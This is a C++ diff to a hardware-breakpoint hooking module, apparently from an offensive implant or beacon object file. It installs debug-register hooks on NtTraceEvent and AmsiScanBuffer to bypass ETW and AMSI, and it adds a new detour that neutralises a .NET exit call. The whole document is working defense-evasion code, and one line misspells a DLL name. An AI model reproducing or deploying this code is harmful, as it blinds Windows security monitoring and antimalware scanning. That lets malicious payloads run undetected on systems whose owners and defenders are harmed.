@@ -1,11 +1,11 @@
 #include <General.hpp>
 
-DESCRIPTOR_HOOK*      Threads = nullptr;
-RTL_CRITICAL_SECTION* Crt     = nullptr;
-CRITICAL_SECTION*     CritSec = nullptr;
+SEC_ATTR(".data") DESCRIPTOR_HOOK*      Threads = nullptr;
+SEC_ATTR(".data") RTL_CRITICAL_SECTION* Crt     = nullptr;
+SEC_ATTR(".data") CRITICAL_SECTION*     CritSec = nullptr;
 
-PVOID Handler     = nullptr;
-BOOL  Initialized = FALSE;
+SEC_ATTR(".data") PVOID Handler         = nullptr;
+SEC_ATTR(".data") BOOL  HwbpInitialized = FALSE;
 
 auto Hwbp::SetDr7(
     _In_ UPTR ActVal,
@@ -248,7 +248,7 @@ _BOF_END:
 }
 
 auto Hwbp::Init( VOID ) -> BOOL {
-    if ( Initialized ) return TRUE;
+    if ( HwbpInitialized  ) return TRUE;
     
     CritSec = Mem::Alloc<PRTL_CRITICAL_SECTION>( sizeof( RTL_CRITICAL_SECTION ) );
 
@@ -262,13 +262,13 @@ auto Hwbp::Init( VOID ) -> BOOL {
 
 
     RtlInitializeCriticalSection( CritSec );
-    Initialized = TRUE;
+    HwbpInitialized  = TRUE;
 
     return TRUE;
 }
 
 auto Hwbp::Clean( VOID ) -> BOOL {
-    if ( !Initialized ) return TRUE;
+    if ( !HwbpInitialized  ) return TRUE;
 
     RtlEnterCriticalSection( CritSec );
 
@@ -288,7 +288,7 @@ auto Hwbp::Clean( VOID ) -> BOOL {
     RtlDeleteCriticalSection( CritSec );
     Mem::Free( CritSec );
 
-    Initialized = FALSE;
+    HwbpInitialized  = FALSE;
 
     return TRUE;
 }
@@ -364,7 +364,7 @@ auto Hwbp::AddNewThreads(
 auto Hwbp::RmNewThreads(
     _In_ INT8 Drx
 ) -> BOOL {
-    return Hwbp::Uninstall( U_PTR( NtCreateThreadEx ), HW_ALL_THREADS );
+    return Hwbp::Uninstall( U_PTR( GetProcAddress( GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx") ), HW_ALL_THREADS );
 }
 
 auto Hwbp::NtCreateThreadExHk(
@@ -386,19 +386,23 @@ auto Hwbp::NtCreateThreadExHk(
     CONTINUE_EXEC( Ctx );
 }
 
-auto Hwbp::DotnetInit( VOID ) -> BOOL {
-    if( !Hwbp::Init() ) return FALSE;
+auto Hwbp::PatchExitDetour( PCONTEXT Ctx ) -> VOID {
+    Ctx->Rax  = 0;
+    Ctx->Rip  = *(UPTR*)Ctx->Rsp;
+    Ctx->Rsp += sizeof( PVOID );
+} 
 
-    BOOL Success = FALSE;
+auto Hwbp::DotnetInit( VOID ) -> BOOL {
+    if( ! Hwbp::Init() ) return FALSE;
+
+    BOOL Success = TRUE;
 
     if ( Dotnet::Bypass ) {
-
         if ( Dotnet::Bypass == KH_BYPASS_ETW || Dotnet::Bypass == KH_BYPASS_ALL ) {
             Hwbp::Etw.NtTraceEvent = (UPTR)GetProcAddress( GetModuleHandleA( "ntll.dll" ), "NtTraceEvent" );
             Success = Hwbp::Install( Hwbp::Etw.NtTraceEvent, Dr::x1, (PVOID)Hwbp::EtwDetour, NtCurrentThreadID );
             if ( ! Success ) return Success;
         }
-
 
         if ( Dotnet::Bypass == KH_BYPASS_AMSI || Dotnet::Bypass == KH_BYPASS_ALL ) {
             if ( ! Hwbp::Amsi.Handle ) {
@@ -412,6 +416,10 @@ auto Hwbp::DotnetInit( VOID ) -> BOOL {
             Success = Hwbp::Install( Hwbp::Amsi.AmsiScanBuffer, Dr::x2, (PVOID)Hwbp::AmsiDetour, NtCurrentThreadID );
             if ( ! Success ) return Success;
         }
+    }
+
+    if ( Dotnet::ExitBypass ) {
+        Success = Hwbp::Install( (UPTR)Dotnet::ExitPtr, Dr::x3, (PVOID)Hwbp::PatchExitDetour, NtCurrentThreadID );
     }
 
     return Success;
